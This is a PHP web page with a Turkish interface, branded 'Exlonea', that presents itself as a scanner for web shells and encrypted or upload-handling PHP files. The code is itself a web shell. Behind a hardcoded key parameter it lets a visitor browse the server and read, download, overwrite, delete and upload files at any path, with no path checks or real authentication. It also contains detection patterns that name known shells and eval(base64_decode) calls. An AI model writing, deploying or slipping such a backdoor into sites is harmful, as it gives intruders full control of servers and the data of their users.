<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

$encrypted_files = [];
$malicious_files = [];
$upload_files = [];

function listDirectoryContents($dir) {
    $contents = ['files' => [], 'dirs' => []];
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        $type = is_dir($path) ? 'dirs' : 'files';
        $contents[$type][] = [
            'name' => $item,
            'path' => $path,
            'type' => is_dir($path) ? 'directory' : 'file',
            'mtime' => filemtime($path)
        ];
    }
    usort($contents['files'], function($a, $b) { return strnatcmp($a['name'], $b['name']); });
    usort($contents['dirs'], function($a, $b) { return strnatcmp($a['name'], $b['name']); });
    return array_merge($contents['dirs'], $contents['files']);
}

function scanForEncrypted($dir) {
    global $encrypted_files;
    $files = scandir($dir);
    foreach ($files as $file) {
        if ($file === '.' || $file === '..') {
            continue;
        }
        $path = $dir . DIRECTORY_SEPARATOR . $file;
        if (is_dir($path)) {
            scanForEncrypted($path);
        } elseif (is_file($path) && pathinfo($path, PATHINFO_EXTENSION) === 'php') {
            try {
                $content = @file_get_contents($path);
                if ($content === false) {
                    continue;
                }
                if (isIonCubeEncrypted($content)) {
                    $encrypted_files[] = $path;
                }
            } catch (Exception $e) {
                continue;
            }
        }
    }
}

function scanForMaliciousAndUpload($dir) {
    global $malicious_files, $upload_files;
    $files = scandir($dir);
    foreach ($files as $file) {
        if ($file === '.' || $file === '..') {
            continue;
        }
        $path = $dir . DIRECTORY_SEPARATOR . $file;
        if (is_dir($path)) {
            scanForMaliciousAndUpload($path);
        } elseif (is_file($path) && pathinfo($path, PATHINFO_EXTENSION) === 'php') {
            try {
                if (filesize($path) > 10 * 1024 * 1024) {
                    continue;
                }
                $content = @file_get_contents($path);
                if ($content === false) {
                    continue;
                }
                if (isMaliciousShell($content)) {
                    $malicious_files[] = $path;
                }
                if (hasFileUpload($content)) {
                    $upload_files[] = $path;
                }
            } catch (Exception $e) {
                continue;
            }
        }
    }
}

function isIonCubeEncrypted($content) {
    if (preg_match('/ionCube/i', $content)) {
        return true;
    }
    if (strpos($content, '__halt_compiler') !== false) {
        $binary_data = substr($content, strpos($content, '__halt_compiler') + strlen('__halt_compiler'));
        return preg_match('/[\x00-\x1F\x7F-\xFF]{100,}/', $binary_data);
    }
    if (preg_match('/<\?php\s*(return\s*array|class|function|if|foreach|while|\$[\w]+\s*=)/i', $content)) {
        return false;
    }
    $total_length = strlen($content);
    if ($total_length == 0) {
        return false;
    }
    $binary_length = strlen(preg_replace('/[\p{L}\p{N}\p{P}\p{S}\s]/u', '', $content));
    if ($binary_length / $total_length > 0.7) {
        return true;
    }
    return false;
}

function isMaliciousShell($content) {
    $shell_patterns = [
        '/Alfa\s*Shell/i',
        '/Webcorn\s*Shell/i',
        '/Killed\s*Shell/i',
        '/eval\s*\(\s*base64_decode/i',
        '/exec\s*\(/i',
        '/shell_exec\s*\(/i',
        '/system\s*\(/i',
        '/passthru\s*\(/i',
        '/preg_replace\s*\(.*?\/e/i',
        '/backdoor/i',
        '/webshell/i',
        '/cmd\s*=/i',
    ];
    foreach ($shell_patterns as $pattern) {
        if (preg_match($pattern, $content)) {
            return true;
        }
    }
    return false;
}

function hasFileUpload($content) {
    $upload_patterns = [
        '/\$_FILES\s*\[/i',
        '/move_uploaded_file\s*\(/i',
        '/file_get_contents\s*\(\s*["\']http/i',
        '/curl_init\s*\(/i',
        '/copy\s*\(\s*["\']http/i',
        '/<input[^>]+type\s*=\s*["\']file["\']/i',
        '/multipart\/form-data/i',
    ];
    foreach ($upload_patterns as $pattern) {
        if (preg_match($pattern, $content)) {
            return true;
        }
    }
    return false;
}

function getFileUrl($file_path, $base_dir) {
    $relative_path = str_replace($base_dir . DIRECTORY_SEPARATOR, '', $file_path);
    return 'http://' . $_SERVER['HTTP_HOST'] . '/' . str_replace(DIRECTORY_SEPARATOR, '/', $relative_path);
}

function generateBreadcrumb($path, $base_dir) {
    $parts = explode(DIRECTORY_SEPARATOR, $path);
    $breadcrumb = [];
    $current_path = '';
    foreach ($parts as $part) {
        if (empty($part)) continue;
        $current_path .= DIRECTORY_SEPARATOR . $part;
        $breadcrumb[] = [
            'name' => $part,
            'path' => $current_path
        ];
    }
    return $breadcrumb;
}

$base_dir = $_SERVER['DOCUMENT_ROOT'];
$current_file = __FILE__;
$current_dir = dirname($current_file);

if (!isset($_GET['key']) || $_GET['key'] !== 'exlonea') {
    exit;
}

// Handle file download
if (isset($_GET['download']) && isset($_GET['file']) && is_file($_GET['file'])) {
    $file_path = $_GET['file'];
    $file_name = basename($file_path);
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . $file_name . '"');
    header('Content-Length: ' . filesize($file_path));
    readfile($file_path);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['save_file']) && isset($_POST['file_path']) && isset($_POST['file_content'])) {
        $file_path = $_POST['file_path'];
        if (is_writable($file_path)) {
            file_put_contents($file_path, $_POST['file_content']);
            $message = '<p class="success">Dosya başarıyla kaydedildi!</p>';
        } else {
            $message = '<p class="error">Hata: Dosya yazılabilir değil!</p>';
        }
    }
    if (isset($_POST['delete_file']) && isset($_POST['file_path'])) {
        $file_path = $_POST['file_path'];
        if (is_writable($file_path)) {
            unlink($file_path);
            $message = '<p class="success">Dosya başarıyla silindi!</p>';
        } else {
            $message = '<p class="error">Hata: Dosya silinemedi!</p>';
        }
    }
    if (isset($_FILES['upload_file']) && isset($_POST['upload_dir'])) {
        $upload_dir = $_POST['upload_dir'];
        $uploaded_file = $_FILES['upload_file'];
        $target_path = $upload_dir . DIRECTORY_SEPARATOR . basename($uploaded_file['name']);
        if (move_uploaded_file($uploaded_file['tmp_name'], $target_path)) {
            $message = '<p class="success">Dosya başarıyla yüklendi: <a href="' . htmlspecialchars(getFileUrl($target_path, $base_dir)) . '" target="_blank">' . htmlspecialchars(basename($uploaded_file['name'])) . '</a></p>';
        } else {
            $message = '<p class="error">Hata: Dosya yüklenemedi!</p>';
        }
    }
}
?>

<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exlonea - Shell Tarama</title>
    <style>
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            margin: 0;
            padding: 2rem;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            color: #e0e0e0;
            line-height: 1.6;
            box-sizing: border-box;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 1rem;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 12px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
            backdrop-filter: blur(10px);
        }
        h2 {
            font-size: 2rem;
            color: #00d4ff;
            text-shadow: 0 0 10px rgba(0, 212, 255, 0.5);
            margin-bottom: 1.5rem;
        }
        .error {
            color: #ff4d4d;
            font-size: 0.9rem;
            background: rgba(255, 77, 77, 0.1);
            padding: 0.5rem 1rem;
            border-radius: 8px;
            margin-bottom: 1rem;
        }
        .success {
            color: #00cc99;
            font-size: 0.9rem;
            background: rgba(0, 204, 153, 0.1);
            padding: 0.5rem 1rem;
            border-radius: 8px;
            margin-bottom: 1rem;
        }
        .result {
            margin-top: 1.5rem;
        }
        .collapsible {
            background: linear-gradient(90deg, #6b48ff 0%, #00ddeb 100%);
            color: #fff;
            cursor: pointer;
            padding: 0.75rem 1.5rem;
            border: none;
            border-radius: 8px;
            width: 100%;
            text-align: left;
            font-size: 1rem;
            margin-bottom: 0.75rem;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        .collapsible:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 16px rgba(0, 221, 235, 0.3);
        }
        .collapsible-content {
            max-height: 0;
            overflow: hidden;
            transition: max-height 0.3s ease-out;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 8px;
            margin-bottom: 1rem;
        }
        .collapsible-content.active {
            max-height: 400px;
            overflow-y: auto;
        }
        .collapsible-content ul {
            list-style-type: none;
            padding: 1rem;
            margin: 0;
        }
        textarea {
            width: 100%;
            margin-top: 0.75rem;
            height: 40vh;
            background: #1f2528;
            color: #e0e0e0;
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            padding: 1rem;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.9rem;
            resize: vertical;
            transition: border-color 0.2s;
        }
        textarea:focus {
            border-color: #00ddeb;
            outline: none;
            box-shadow: 0 0 8px rgba(0, 221, 235, 0.3);
        }
        ul {
            list-style-type: none;
            padding: 0;
        }
        li {
            padding: 0.5rem 0;
            font-size: 0.95rem;
            transition: background 0.2s;
        }
        li:hover {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 6px;
        }
        a {
            text-decoration: none;
            color: #00ddeb;
            transition: color 0.2s;
        }
        a:hover {
            color: #ff4d4d;
        }
        .no-underline, .no-underline:hover {
            text-decoration: none;
        }
        .file-actions {
            margin-top: 1rem;
            display: flex;
            gap: 0.75rem;
            flex-wrap: wrap;
        }
        .file-actions button, .scan-button {
            padding: 0.6rem 1.5rem;
            color: #fff;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 0.95rem;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        .file-actions button:hover, .scan-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.3);
        }
        .file-actions button {
            background: linear-gradient(90deg, #6b48ff 0%, #00ddeb 100%);
        }
        .file-actions .delete-btn {
            background: linear-gradient(90deg, #ff4d4d 0%, #e63939 100%);
        }
        .file-actions .download-btn {
            background: linear-gradient(90deg, #00cc99 0%, #00b386 100%);
        }
        .breadcrumb {
            margin-bottom: 1.5rem;
            font-size: 0.9rem;
            background: rgba(255, 255, 255, 0.05);
            padding: 0.5rem 1rem;
            border-radius: 8px;
        }
        .breadcrumb a {
            margin-right: 0.5rem;
            color: #00ddeb;
        }
        .breadcrumb a:hover {
            color: #ff4d4d;
        }
        .directory-list {
            margin-top: 1.5rem;
        }
        .directory-list h3 {
            font-size: 1.2rem;
            color: #fff;
            margin-bottom: 0.75rem;
        }
        .directory-list ul {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 1rem;
            border-radius: 8px;
            max-height: 400px;
            overflow-y: auto;
            scrollbar-width: thin;
            scrollbar-color: #00ddeb rgba(255, 255, 255, 0.1);
        }
        .directory-list ul::-webkit-scrollbar {
            width: 8px;
        }
        .directory-list ul::-webkit-scrollbar-track {
            background: rgba(255, 255, 255, 0.1);
        }
        .directory-list ul::-webkit-scrollbar-thumb {
            background: #00ddeb;
            border-radius: 4px;
        }
        .directory-list li.directory a {
            font-weight: 600;
            color: #ff4d4d;
        }
        .footer {
            margin-top: 2rem;
            text-align: center;
            font-size: 0.85rem;
            color: #a0a0a0;
        }
        .footer a {
            color: #a0a0a0;
            text-decoration: none;
        }
        .footer a:hover {
            color: #00ddeb;
        }
        .scan-form {
            margin: 1.5rem 0;
            display: flex;
            gap: 1rem;
            align-items: center;
        }
        .scan-button {
            background: linear-gradient(90deg, #6b48ff 0%, #00ddeb 100%);
        }
        .upload-form {
            margin: 1.5rem 0;
            display: flex;
            gap: 0.75rem;
            align-items: center;
        }
        .upload-form input[type="file"] {
            padding: 0.5rem;
            background: #1f2528;
            color: #e0e0e0;
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            cursor: pointer;
        }
        .upload-form input[type="file"]::-webkit-file-upload-button {
            background: #6b48ff;
            color: #fff;
            border: none;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            cursor: pointer;
            transition: background 0.2s;
        }
        .upload-form input[type="file"]::-webkit-file-upload-button:hover {
            background: #00ddeb;
        }
        .current-dir a {
            color: #00ddeb;
            text-decoration: none;
        }
        .current-dir a:hover {
            color: #ff4d4d;
        }

        @media (max-width: 768px) {
            body {
                padding: 1rem;
            }
            h2 {
                font-size: 1.5rem;
            }
            .container {
                padding: 0.75rem;
            }
            textarea {
                font-size: 0.85rem;
                height: 30vh;
            }
            .file-actions button, .scan-button {
                font-size: 0.85rem;
                padding: 0.5rem 1rem;
            }
            .breadcrumb {
                font-size: 0.8rem;
            }
            .directory-list h3 {
                font-size: 1rem;
            }
            .directory-list li {
                font-size: 0.9rem;
            }
            .collapsible {
                font-size: 0.9rem;
            }
            .scan-form {
                flex-direction: column;
                gap: 0.75rem;
                align-items: stretch;
            }
            .upload-form {
                flex-direction: column;
                gap: 0.75rem;
                align-items: stretch;
            }
        }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&family=JetBrains+Mono&display=swap" rel="stylesheet">
    <script>
        function toggleCollapsible(element) {
            const content = element.nextElementSibling;
            content.classList.toggle('active');
        }
    </script>
</head>
<body>
    <div class="container">
        <h2><a href="<?php echo htmlspecialchars($_SERVER['PHP_SELF'] . '?key=exlonea'); ?>" class="no-underline">🖥️ Exlonea 🖥️</a></h2>
        
        <div class="breadcrumb">
            <strong>Geçerli Konum:</strong>
            <?php
            $breadcrumb = generateBreadcrumb($current_file, $base_dir);
            foreach ($breadcrumb as $index => $item) {
                if ($index > 0) echo ' / ';
                echo '<a href="?key=exlonea&view_dir=' . urlencode($item['path']) . '">' . htmlspecialchars($item['name']) . '</a>';
            }
            ?>
        </div>

        <?php
        if (isset($message)) {
            echo $message;
        }

        $view_dir = isset($_GET['view_dir']) ? $_GET['view_dir'] : $current_dir;
        if (is_dir($view_dir)) {
            echo '<div class="directory-list">';
            echo '<h3>Seçilen Dizin: <span class="current-dir">';
            $dir_parts = explode(DIRECTORY_SEPARATOR, $view_dir);
            $current_path = '';
            foreach ($dir_parts as $index => $part) {
                if (empty($part)) continue;
                $current_path .= DIRECTORY_SEPARATOR . $part;
                if ($index > 0) echo ' / ';
                echo '<a href="?key=exlonea&view_dir=' . urlencode($current_path) . '">' . htmlspecialchars($part) . '</a>';
            }
            echo '</span></h3>';
            echo '<form class="scan-form" method="post">';
            echo '<input type="hidden" name="directory" value="' . htmlspecialchars($view_dir) . '">';
            echo '<button type="submit" name="scan_encrypted" class="scan-button">Şifreli Dosyalar</button>';
            echo '<button type="submit" name="scan_malicious" class="scan-button">Shell ve Zararlı Yazılımlar</button>';
            echo '</form>';
            echo '<form class="upload-form" method="post" enctype="multipart/form-data">';
            echo '<input type="hidden" name="upload_dir" value="' . htmlspecialchars($view_dir) . '">';
            echo '<input type="file" name="upload_file" required>';
            echo '<button type="submit" class="scan-button">Dosya Yükle</button>';
            echo '</form>';
            $contents = listDirectoryContents($view_dir);
            if (!empty($contents)) {
                echo '<ul>';
                foreach ($contents as $item) {
                    $icon = $item['type'] === 'directory' ? '📁 ' : '📄 ';
                    $url = $item['type'] === 'directory' 
                        ? '?key=exlonea&view_dir=' . urlencode($item['path']) 
                        : '?key=exlonea&view_dir=' . urlencode($view_dir) . '&file=' . urlencode($item['path']);
                    echo '<li class="' . $item['type'] . '"><a href="' . $url . '">' . $icon . htmlspecialchars($item['name']) . '</a></li>';
                }
                echo '</ul>';
            } else {
                echo '<p>Bu dizinde içerik bulunamadı.</p>';
            }
            echo '</div>';
        }
        ?>

        <?php
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && (isset($_POST['scan_encrypted']) || isset($_POST['scan_malicious']))) {
            $directory = rtrim($_POST['directory'], '/\\');
            
            if (!is_dir($directory)) {
                echo '<p class="error">Hata: Geçersiz veya erişilemeyen dizin yolu!</p>';
            } else {
                echo '<div class="result">';
                if (isset($_POST['scan_encrypted'])) {
                    $encrypted_files = [];
                    scanForEncrypted($directory);
                    echo '<button class="collapsible" onclick="toggleCollapsible(this)">Şifreli Dosyalar</button>';
                    echo '<div class="collapsible-content">';
                    if (empty($encrypted_files)) {
                        echo '<p class="success">Şifreli dosya bulunamadı!</p>';
                    } else {
                        echo '<ul>';
                        foreach ($encrypted_files as $index => $file) {
                            echo '<li>' . ($index + 1) . '. <a href="?key=exlonea&file=' . urlencode($file) . '">' . htmlspecialchars(str_replace($base_dir . DIRECTORY_SEPARATOR, '', $file)) . '</a></li>';
                        }
                        echo '</ul>';
                    }
                    echo '</div>';
                }
                if (isset($_POST['scan_malicious'])) {
                    $malicious_files = [];
                    $upload_files = [];
                    try {
                        scanForMaliciousAndUpload($directory);
                        echo '<button class="collapsible" onclick="toggleCollapsible(this)">Zararlı Shell Dosyaları</button>';
                        echo '<div class="collapsible-content">';
                        if (empty($malicious_files)) {
                            echo '<p class="success">Zararlı shell dosyası bulunamadı!</p>';
                        } else {
                            echo '<ul>';
                            foreach ($malicious_files as $index => $file) {
                                echo '<li>' . ($index + 1) . '. <a href="?key=exlonea&file=' . urlencode($file) . '">' . htmlspecialchars(str_replace($base_dir . DIRECTORY_SEPARATOR, '', $file)) . '</a></li>';
                            }
                            echo '</ul>';
                        }
                        echo '</div>';
                        echo '<button class="collapsible" onclick="toggleCollapsible(this)">Dosya Yükleme Dosyaları</button>';
                        echo '<div class="collapsible-content">';
                        if (empty($upload_files)) {
                            echo '<p class="success">Dosya yükleme işlemi yapan dosya bulunamadı!</p>';
                        } else {
                            echo '<ul>';
                            foreach ($upload_files as $index => $file) {
                                echo '<li>' . ($index + 1) . '. <a href="?key=exlonea&file=' . urlencode($file) . '">' . htmlspecialchars(str_replace($base_dir . DIRECTORY_SEPARATOR, '', $file)) . '</a></li>';
                            }
                            echo '</ul>';
                        }
                        echo '</div>';
                    } catch (Exception $e) {
                        echo '<p class="error">Hata: Shell ve dosya yükleme tarama sırasında bir hata oluştu: ' . htmlspecialchars($e->getMessage()) . '</p>';
                    }
                }
                echo '</div>';
            }
        }

        if (isset($_GET['file']) && is_file($_GET['file'])) {
            $file_path = $_GET['file'];
            try {
                $content = @file_get_contents($file_path);
                if ($content === false) {
                    echo '<p class="error">Hata: Dosya içeriği okunamadı!</p>';
                } else {
                    echo '<h3>Dosya İçeriği: ' . htmlspecialchars(str_replace($base_dir . DIRECTORY_SEPARATOR, '', $file_path)) . '</h3>';
                    echo '<form method="post">';
                    echo '<input type="hidden" name="file_path" value="' . htmlspecialchars($file_path) . '">';
                    echo '<textarea name="file_content">' . htmlspecialchars($content) . '</textarea>';
                    echo '<div class="file-actions">';
                    echo '<button type="submit" name="save_file">Kaydet</button>';
                    echo '<a href="' . htmlspecialchars(getFileUrl($file_path, $base_dir)) . '" target="_blank"><button type="button">Dosyaya Git</button></a>';
                    echo '<a href="?key=exlonea&file=' . urlencode($file_path) . '&download=1"><button type="button" class="download-btn">İndir</button></a>';
                    echo '<button type="submit" name="delete_file" class="delete-btn" onclick="return confirm(\'Bu dosyayı silmek istediğinizden emin misiniz?\')">Sil</button>';
                    echo '</div>';
                    echo '</form>';
                }
            } catch (Exception $e) {
                echo '<p class="error">Hata: Dosya içeriği görüntülenirken bir hata oluştu: ' . htmlspecialchars($e->getMessage()) . '</p>';
            }
        }
        ?>
        <div class="footer">
            <a href="https://t.me/Exlonea" class="no-underline">Copyright © Exlonea - 2025</a>
        </div>
    </div>
</body>
</html>